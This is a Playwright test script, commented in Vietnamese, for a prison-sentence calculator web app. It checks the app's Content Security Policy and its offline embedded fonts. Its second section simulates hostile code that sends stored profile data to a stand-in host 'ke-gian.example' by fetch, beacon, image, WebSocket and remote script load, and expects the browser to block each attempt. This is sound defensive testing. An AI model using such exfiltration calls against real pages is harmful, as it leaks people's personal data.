// v97: Chính sách bảo mật nội dung (CSP) và phông chữ nhúng sẵn
//  1. Dùng thử các chức năng chính: CSP không chặn nhầm chức năng nào
//  2. Giả làm mã lạ tìm cách gửi dữ liệu ra ngoài: trình duyệt phải chặn
//  3. Phông chữ hiện đúng khi không có mạng, không còn gọi Google Fonts
const path=require('path'),fs=require('fs'),os=require('os');
const {chromium}=require('playwright');
const SP=os.tmpdir()+'/';
const file='file://'+path.resolve(process.argv[2]);
(async()=>{
  const b=await chromium.launch();
  const ctx=await b.newContext({viewport:{width:390,height:844},timezoneId:'Asia/Ho_Chi_Minh',locale:'vi-VN',acceptDownloads:true});
  // Ghi lại mọi lần CSP chặn, đăng ký trước khi mã của trang chạy
  await ctx.addInitScript(()=>{window.__csp=[];document.addEventListener('securitypolicyviolation',e=>window.__csp.push(e.effectiveDirective+' '+e.blockedURI));});
  const pg=await ctx.newPage();
  await pg.clock.setFixedTime(new Date('2026-11-01T09:00:00+07:00'));
  // routed: yêu cầu THỰC SỰ đi tới lớp mạng (bộ chặn của kiểm thử nhận được); failed: lý do trình duyệt hủy yêu cầu
  const reqs=[],routed=[],failed={};pg.on('request',r=>{if(/^https?:/.test(r.url()))reqs.push(r.url());});
  pg.on('requestfailed',r=>{failed[r.url().split('?')[0]]=r.failure()&&r.failure().errorText;});
  await pg.route(/^https?:\/\//,r=>{routed.push(r.request().url());r.abort();});
  const errs=[];pg.on('pageerror',e=>errs.push(e.message));pg.on('dialog',d=>{errs.push('dialog '+d.message());d.dismiss();});
  const ev=(f,...a)=>pg.evaluate(f,...a);
  const ok=(c,m)=>console.log((c?'PASS ':'FAIL ')+m);
  await pg.goto(file);await pg.waitForTimeout(1300);
  // Trên file:// các tệp biểu tượng/manifest bên cạnh (./icon-192.png...) không thuộc 'self' — chỉ xảy ra khi kiểm thử, trên trang thật thì cùng nguồn
  const real=()=>ev(()=>window.__csp.filter(v=>!/^(img-src|manifest-src) file:/.test(v)));

  // 0. Thẻ CSP có mặt, đứng đầu <head>
  const meta=await ev(()=>{const m=document.querySelector('meta[http-equiv="Content-Security-Policy"]');
    const heads=[...document.head.children];return m?{c:m.content,first:heads.indexOf(m)<=1}:null;});
  ok(meta&&meta.first&&/connect-src 'self' https:\/\/cloudflareinsights\.com;/.test(meta.c)&&/default-src 'none'/.test(meta.c)&&!/unsafe-eval/.test(meta.c),
    'Có chính sách CSP ở đầu trang: mặc định cấm hết, chỉ gửi dữ liệu về chính trang (và Cloudflare thống kê)');

  // 1. Dùng thử các chức năng chính
  await ev(()=>{window.showWarn=()=>{};window.print=()=>{};});
  await ev(()=>{const s=(i,v)=>document.getElementById(i).value=v;s('prisonerName','Nguyễn Văn Thử');s('arrestDateText','09/03/2024');s('sY','6 năm');
    escapes=[];k7PickShown=true;setRefMode('today');calculate();});
  ok(await ev(()=>document.getElementById('modalOverlay').classList.contains('show')),'Tính án: ra kết quả');
  await ev(()=>{openRemissionPage();const el=document.getElementById('rmArrival');el.value='15/03/2024';el.dispatchEvent(new Event('input',{bubbles:true}));});
  await ev(()=>{onFlipAction();});await pg.waitForTimeout(100);
  await ev(()=>{closeRemissionPage();closeModal();});
  ok(await ev(()=>loadProfiles().length===1),'Trang tra cứu giảm án, lưu hồ sơ');
  await ev(()=>{openEscape();closeEscape();openGuide&&openGuide();});await pg.waitForTimeout(100);
  await ev(()=>{try{closeGuide();}catch(e){}goNav('team');goNav('review');openGrades();closeGrades();closeTeamPages&&closeTeamPages();});
  await ev(()=>{openProfDetail(0);printProfilePhieu();confirmPrintInfo();});await pg.waitForTimeout(200);
  await ev(()=>{try{closeProfDetail();}catch(e){}});
  const [d1]=await Promise.all([pg.waitForEvent('download'),ev(()=>exportProfilesToExcel('full'))]);
  ok(/\.xlsx$/.test(d1.suggestedFilename()),'Xuất Excel: tải file được ('+d1.suggestedFilename()+')');
  await ev(()=>exportProfilesFile());
  const [d2]=await Promise.all([pg.waitForEvent('download'),ev(()=>confirmPassword())]);
  const enc=SP+'csp-'+d2.suggestedFilename();await d2.saveAs(enc);
  ok(JSON.parse(fs.readFileSync(enc,'utf8')).type==='profiles-enc','Xuất file dữ liệu có mật khẩu: tải file được');
  fs.writeFileSync(SP+'csp.csv','Họ tên;Ngày bắt;Án (năm)\nTrần Văn CSP;15/03/2022;3\n');
  await pg.setInputFiles('#xlImportInput',SP+'csp.csv');await pg.waitForTimeout(400);
  ok(await ev(()=>loadProfiles().some(p=>p.name==='Trần Văn CSP')),'Nhập danh sách từ CSV');
  await ev(()=>{const o=document.getElementById('shareOptOverlay');openShareOpt();closeShareOpt();});
  await ev(()=>{openPin('set');closePin();openSecurity();closeSecurity();});
  await pg.reload();await pg.waitForTimeout(1300);
  ok(await ev(()=>loadProfiles().length===2),'Tải lại trang: hồ sơ còn nguyên');
  const v1=await real();
  ok(!v1.length,'Dùng hết các chức năng trên: CSP không chặn nhầm gì'+(v1.length?' — bị chặn: '+v1.join(' | '):''));

  // 2. Mã lạ tìm cách gửi dữ liệu ra ngoài
  const atk=await ev(async()=>{
    window.__csp=[];const data=encodeURIComponent(JSON.stringify(loadProfiles()).slice(0,200));const out={};
    try{await fetch('https://ke-gian.example/thu?d='+data);out.fetch='gửi được';}catch(e){out.fetch='bị chặn';}
    navigator.sendBeacon('https://ke-gian.example/b',data);   // luôn trả về "đã xếp hàng"; có thực sự gửi hay không xem ở lớp mạng bên dưới
    await new Promise(r=>{const i=new Image();i.onload=()=>{out.img='gửi được';r();};i.onerror=()=>{out.img='bị chặn';r();};i.src='https://ke-gian.example/p.gif?d='+data;});
    await new Promise(r=>{const s=document.createElement('script');s.onload=()=>{out.script='nạp được';r();};s.onerror=()=>{out.script='bị chặn';r();};s.src='https://ke-gian.example/ma-doc.js';document.head.appendChild(s);});
    await new Promise(r=>{try{const w=new WebSocket('wss://ke-gian.example/ws');w.onopen=()=>{out.ws='gửi được';r();};w.onerror=()=>{out.ws='bị chặn';r();};}catch(e){out.ws='bị chặn';r();}});
    await new Promise(r=>setTimeout(r,200));
    out.violations=window.__csp.map(v=>v.split(' ')[0]).filter((v,i,a)=>a.indexOf(v)===i).sort();
    return out;});
  await pg.waitForTimeout(300);
  const out=routed.filter(u=>/ke-gian/.test(u));
  ok(atk.fetch==='bị chặn'&&atk.img==='bị chặn'&&atk.script==='bị chặn'&&atk.ws==='bị chặn'&&!out.length,
    'Mã lạ thử gửi dữ liệu hồ sơ ra máy chủ khác (fetch, beacon, ảnh, WebSocket) và nạp mã độc: đều bị chặn, không yêu cầu nào ra tới mạng'+(out.length?' — LỌT: '+out.join(' | '):''));
  ok(['connect-src','img-src','script-src-elem'].every(d=>atk.violations.includes(d)),'  Trình duyệt ghi nhận do CSP chặn: '+atk.violations.join(', '));
  const why=Object.entries(failed).filter(([u])=>/ke-gian/.test(u)).map(([u,e])=>u.replace('https://ke-gian.example','')+' → '+e);
  ok(why.length>0&&why.every(x=>/csp/i.test(x)),'  Lý do trình duyệt hủy: '+why.join('; '));

  // 3. Phông chữ nhúng sẵn, không cần mạng
  const f=await ev(async()=>{await document.fonts.ready;
    const t='Tính thời hạn chấp hành án phạt tù — Đặng Ưng Ỹ';
    await Promise.all(['400','500','600','700'].map(w=>document.fonts.load(w+' 16px "Be Vietnam Pro"',t)).concat([document.fonts.load('700 19px "Playfair Display"',t)]));
    const loaded=[...document.fonts].filter(x=>x.status==='loaded').map(x=>x.family.replace(/"/g,'')+' '+x.weight);
    const w=(fam,txt)=>{const c=document.createElement('canvas').getContext('2d');c.font=fam;return c.measureText(txt).width;};
    return {loaded:[...new Set(loaded)].sort(),
      differs:w('700 19px "Playfair Display", serif',t)!==w('700 19px serif',t)&&w('400 16px "Be Vietnam Pro", monospace',t)!==w('400 16px monospace',t)};});
  ok(['Be Vietnam Pro 400','Be Vietnam Pro 500','Be Vietnam Pro 600','Be Vietnam Pro 700','Playfair Display 700'].every(x=>f.loaded.includes(x))&&f.differs,
    'Không có mạng vẫn hiện đúng phông Be Vietnam Pro (400–700) và Playfair Display (tiêu đề), cả chữ tiếng Việt');
  ok(!reqs.some(u=>/fonts\.(googleapis|gstatic)\.com/.test(u)),'Không còn gọi Google Fonts');
  const head=await ev(()=>{const r=document.querySelector('.header-title');return r?getComputedStyle(r).fontFamily:'';});
  ok(/Playfair Display/.test(head),'Tiêu đề đầu trang dùng Playfair Display');
  await pg.screenshot({path:SP+'v97-dau-trang.png'});
  console.log('Lỗi JS:',errs.length?errs:'không');
  await b.close();
})();
